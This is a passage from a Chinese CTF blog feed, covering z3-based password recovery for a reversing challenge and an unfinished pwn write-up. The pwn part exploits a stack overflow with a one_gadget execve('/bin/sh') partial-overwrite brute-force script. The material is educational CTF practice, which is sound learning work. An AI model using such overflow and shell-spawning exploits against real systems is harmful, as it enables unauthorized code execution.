class=\"string\">&#x27;dword_6020AC&#x27;</span>)</span><br><span class=\"line\">dword_6020A8 = Int(<span class=\"string\">&#x27;dword_6020A8&#x27;</span>)</span><br><span class=\"line\">s = Int(<span class=\"string\">&#x27;s&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solve ( dword_6020A4 * s - dword_6020AC * dword_6020A8 == <span class=\"number\">0x24CDF2E7C953DA56</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">3</span>* dword_6020A8 + <span class=\"number\">4</span> * dword_6020AC - dword_6020A4 - <span class=\"number\">2</span>*s == <span class=\"number\">397958918</span> ,</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"number\">3</span> *s * dword_6020AC - dword_6020A8 * dword_6020A4 == <span class=\"number\">0x2E6E497E6415CF3E</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">27</span> * dword_6020A4 + s - <span class=\"number\">11</span> * dword_6020AC - dword_6020A8 == <span class=\"number\">0x95AE13337</span> )</span><br></pre></td></tr></table></figure>\n\n<p>求解得到下面的值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/re<span class=\"comment\"># python3 1.py</span></span><br><span class=\"line\">[dword_6020A4 = <span class=\"number\">1801073242</span>,</span><br><span class=\"line\"> dword_6020AC = <span class=\"number\">862734414</span>,</span><br><span class=\"line\"> dword_6020A8 = <span class=\"number\">829124174</span>,</span><br><span class=\"line\"> s = <span class=\"number\">1869639009</span>]</span><br></pre></td></tr></table></figure>\n\n<p>然后再进一步往下走,利用c的srand得到随机数种子,然后下面的几个值就确定了,又根据这四个判断条件,即四元一次方程组,又可以解出四个值来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC);</span><br><span class=\"line\">  v6 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v7 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v8 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v9 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v10 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v11 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v12 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\">  v13 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v7 + v2 * v6 - v3 - v4 != 0xE638C96D3LL )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v5 + v2 + v4 * v9 - v3 * v8 == 0xB59F2D0CBLL</span><br><span class=\"line\">      &amp;&amp; v2 * v10 + v3 * v11 - v4 - v5 == 0xDCFE88C6DLL</span><br><span class=\"line\">      &amp;&amp; v4 * v13 + v2 - v3 - v5 * v12 == 0xC076D98BBLL;</span><br></pre></td></tr></table></figure>\n\n<p>​\t先用c语言把v6-13解出来</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"><span class=\"type\">int</span> dword_6020A4 = <span class=\"number\">1801073242</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> dword_6020AC = <span class=\"number\">862734414</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> dword_6020A8 = <span class=\"number\">829124174</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> s = <span class=\"number\">1869639009</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">srand((dword_6020A8)^(dword_6020A4)^(s)^(dword_6020AC));</span><br><span class=\"line\"><span class=\"type\">int</span>  v6 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v7 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v8 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v9 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v10 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v11 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v12 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>  v13 = rand() % <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v6);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v7);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v8);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v9);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v10);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v11);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v12);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v13);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/re# ./a.out</span><br><span class=\"line\"><span class=\"number\">22</span></span><br><span class=\"line\"><span class=\"number\">39</span></span><br><span class=\"line\"><span class=\"number\">45</span></span><br><span class=\"line\"><span class=\"number\">45</span></span><br><span class=\"line\"><span class=\"number\">35</span></span><br><span class=\"line\"><span class=\"number\">41</span></span><br><span class=\"line\"><span class=\"number\">13</span></span><br><span class=\"line\"><span class=\"number\">36</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后就可以解最后一个方程组了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v7 + v2 * v6 - v3 - v4 != <span class=\"number\">0xE638C96D3</span>LL )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v5 + v2 + v4 * v9 - v3 * v8 == <span class=\"number\">0xB59F2D0CB</span>LL</span><br><span class=\"line\">      &amp;&amp; v2 * v10 + v3 * v11 - v4 - v5 == <span class=\"number\">0xDCFE88C6D</span>LL</span><br><span class=\"line\">      &amp;&amp; v4 * v13 + v2 - v3 - v5 * v12 == <span class=\"number\">0xC076D98BB</span>LL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">39</span>*v5 + <span class=\"number\">22</span>*v2 -v3-v4 == <span class=\"number\">0xE638C96D3</span>,</span><br><span class=\"line\">v5 + v2 + v4*<span class=\"number\">45</span> -v3*<span class=\"number\">45</span> ==<span class=\"number\">0xB59F2D0CB</span>,</span><br><span class=\"line\">v2 * <span class=\"number\">35</span> + v3*<span class=\"number\">41</span>  -v4 -v5 == <span class=\"number\">0xDCFE88C6D</span>,</span><br><span class=\"line\">v4 *<span class=\"number\">36</span> + v2 - v3 - v5 * <span class=\"number\">13</span> == <span class=\"number\">0xC076D98BB</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> * </span><br><span class=\"line\"></span><br><span class=\"line\">v2 = Int(<span class=\"string\">&#x27;v2&#x27;</span>)</span><br><span class=\"line\">v3 = Int(<span class=\"string\">&#x27;v3&#x27;</span>)</span><br><span class=\"line\">v4 = Int(<span class=\"string\">&#x27;v4&#x27;</span>)</span><br><span class=\"line\">v5 = Int(<span class=\"string\">&#x27;v5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solve ( <span class=\"number\">39</span>*v5 + <span class=\"number\">22</span>*v2 -v3-v4 == <span class=\"number\">0xE638C96D3</span>,</span><br><span class=\"line\">v5 + v2 + v4*<span class=\"number\">45</span> -v3*<span class=\"number\">45</span> ==<span class=\"number\">0xB59F2D0CB</span>,</span><br><span class=\"line\">v2 * <span class=\"number\">35</span> + v3*<span class=\"number\">41</span>  -v4 -v5 == <span class=\"number\">0xDCFE88C6D</span>,</span><br><span class=\"line\">v4 *<span class=\"number\">36</span> + v2 - v3 - v5 * <span class=\"number\">13</span> == <span class=\"number\">0xC076D98BB</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t得到结果</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[v3 = <span class=\"number\">828593230</span>,</span><br><span class=\"line\"> v5 = <span class=\"number\">1195788129</span>,</span><br><span class=\"line\"> v2 = <span class=\"number\">811816014</span>,</span><br><span class=\"line\"> v4 = <span class=\"number\">1867395930</span>]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>根据前面信息可知<br>v2 &#x3D; unk_6020B0;<br>v3 &#x3D; unk_6020B4;<br>v4 &#x3D; unk_6020B8;<br>v5 &#x3D; unk_6020BC; </p>\n<p>于是就得到了s的7个部分,把这些部分加起来,然后转换成ascii码即可得到输入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = <span class=\"number\">828593230</span>,</span><br><span class=\"line\"> v5 = <span class=\"number\">1195788129</span>,</span><br><span class=\"line\"> v2 = <span class=\"number\">811816014</span>,</span><br><span class=\"line\"> v4 = <span class=\"number\">1867395930</span></span><br><span class=\"line\">dword_6020A4 = <span class=\"number\">1801073242</span>,</span><br><span class=\"line\"> dword_6020AC = <span class=\"number\">862734414</span>,</span><br><span class=\"line\"> dword_6020A8 = <span class=\"number\">829124174</span>,</span><br><span class=\"line\"> s = <span class=\"number\">1869639009</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1869639009180107324282912417486273441481181601482859323018673959301195788129</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t刚开始把这些数都连起来,然后每两个输出ascii,发现不对,后来看了wp,自己想了下,他们是10进制数,应该先把每个值转换成16进制,再输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = [<span class=\"number\">1869639009</span>,<span class=\"number\">1801073242</span>,<span class=\"number\">829124174</span>,<span class=\"number\">862734414</span>,<span class=\"number\">811816014</span>,<span class=\"number\">828593230</span>,<span class=\"number\">1867395930</span>,<span class=\"number\">1195788129</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">    i = <span class=\"built_in\">hex</span>(i)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>]:</span><br><span class=\"line\">        <span class=\"comment\">#print(i[j:j+2])</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i[j:j+<span class=\"number\">2</span>],<span class=\"number\">16</span>)),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">内循环也可以这样写</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>,<span class=\"built_in\">len</span>(i),<span class=\"number\">2</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i[j:j+<span class=\"number\">2</span>],<span class=\"number\">16</span>)),end=<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​        这里遇到的问题是怎么把这个串转ascii…因为把10进制转16进制后会被认作为一个字符串,取值的话又成了十进制…用chr(int(原始的数,进制数)) 就可以了! </p>\n<p>​\t\t参考:<a href=\"https://www.jb51.net/article/119202.htm\">https://www.jb51.net/article/119202.htm</a></p>\n<p>​\t\t但是得到的结果为什么是反的????(每四个为一组)opmakZ2Z1knN3lHN0cTN1cTNoN3ZGFGa</p>\n<p>​\t\t<font color=\"red\">和大端小端有关系????????????好像不是的</font></p>\n<p>​\t\tj+2会不会有问题,如果不够了呢?????</p>\n<p>​\t\t那就需要反转一下了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = [<span class=\"number\">1869639009</span>,<span class=\"number\">1801073242</span>,<span class=\"number\">829124174</span>,<span class=\"number\">862734414</span>,<span class=\"number\">811816014</span>,<span class=\"number\">828593230</span>,<span class=\"number\">1867395930</span>,<span class=\"number\">1195788129</span>]</span><br><span class=\"line\">tmp = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">final = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">    i = <span class=\"built_in\">hex</span>(i)</span><br><span class=\"line\">    tmp = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>,<span class=\"built_in\">len</span>(i),<span class=\"number\">2</span>):</span><br><span class=\"line\">        tmp += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i[j:j+<span class=\"number\">2</span>],<span class=\"number\">16</span>)).strip(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    tmp = tmp[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    final += tmp</span><br><span class=\"line\"><span class=\"built_in\">print</span>(final)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t或者用下面的这个库(为什么这个不用反转呢?) [::-1]</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">x = [<span class=\"number\">1869639009</span>,<span class=\"number\">1801073242</span>,<span class=\"number\">829124174</span>,<span class=\"number\">862734414</span>,<span class=\"number\">811816014</span>,<span class=\"number\">828593230</span>,<span class=\"number\">1867395930</span>,<span class=\"number\">1195788129</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> x:</span><br><span class=\"line\">    flag += libnum.n2s(y)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"built_in\">print</span> flag</span><br><span class=\"line\">运算结果：</span><br><span class=\"line\">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br><span class=\"line\">opmakZ2Z1knN3lHN0cTN1cTNoN3ZGFGa</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/re# ./My\\ math\\ is\\ bad</span><br><span class=\"line\">=======================================</span><br><span class=\"line\">= Welcome to the flag access machine! =</span><br><span class=\"line\">=   Input the password to login ...   =</span><br><span class=\"line\">=======================================</span><br><span class=\"line\">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br><span class=\"line\">Congratulations! You should get the flag...</span><br><span class=\"line\">flag&#123;th3_Line@r_4lgebra_1s_d1fficult!&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/",
            "title": "pwn入门-4-one_gadget",
            "date_published": "2022-12-05T14:51:11.000Z",
            "content_html": "<p>未完待续: exp有问题…</p>\n<p>题目来源:asis ctf quals 2017:start hard</p>\n<p><a href=\"https://github.com/boslash/bo8/tree/master/start_hard\">https://github.com/boslash/bo8/tree/master/start_hard</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(<span class=\"built_in\">int</span> a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[<span class=\"number\">16</span>]; // [rsp+10h] [rbp-10h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, 0x400uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用ida查看反汇编代码,一个很明显的缓冲区溢出漏洞,要看开启了什么保护,没有canary,栈好利用一些,但是开了nx,所以得用rop之类的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/tmp/starthard/start_hard&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>用one_gadget看有没有</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/tmp/starthard<span class=\"comment\"># one_gadget ./libc.so.6 </span></span><br><span class=\"line\"><span class=\"number\">0x4526a</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x30</span>] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xef6c4</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x50</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x50</span>] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf0567</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == NULL</span><br><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe460</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x007fffffffe568</span>  →  <span class=\"number\">0x007fffffffe7be</span>  →  <span class=\"string\">&quot;/tmp/starthard/start_hard&quot;</span>\t ← $rsp</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe468</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x0000000100400430</span></span><br><span class=\"line\"><span class=\"number\">0x007fffffffe470</span>│+<span class=\"number\">0x0010</span>: <span class=\"number\">0x6161616161616161</span>\t ← $rsi</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe478</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x6161616161616161</span></span><br><span class=\"line\"><span class=\"number\">0x007fffffffe480</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x6161616161616161</span>\t ← $rbp</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe488</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x007ffff7a03c0a</span>  →  &lt;__libc_start_main+<span class=\"number\">106</span>&gt; mov rsi, QWORD PTR [rsp+<span class=\"number\">0x8</span>]</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t溢出24字节,然后加上0x4526a即可,但是一直打失败了…是因为libc的问题吧,需要链接上 或者用本地的</p>\n<p>​\t\t0x4526a这个地址行吗???,这个地址是什么地址?? </p>\n<p>2023 7 28: \t\t感觉思路没啥问题呀… 是不是可以爆破,是加了随机化是吗… 哦对…是libc中的one_gadget呀..那肯定加了随机化…</p>\n<p>随机化了三个字符, 所以能怎么输入呢?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    p = process(<span class=\"string\">&quot;./start_hard&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">24</span> + p16(<span class=\"number\">0xeafe</span>) + p8(<span class=\"number\">0x23</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Add some delay after each attempt to avoid rapid execution issues</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Read the output from the process</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Check if the exploit was successful and print the result</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">b&quot;Flag&quot;</span> <span class=\"keyword\">in</span> response:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Exploit successful! Flag:&quot;</span>, response.split(<span class=\"string\">b&quot;\\n&quot;</span>)[-<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Number of attempts you want to perform</span></span><br><span class=\"line\">num_attempts = <span class=\"number\">100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_attempts):</span><br><span class=\"line\">    exploit()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20231116210352866.png\" 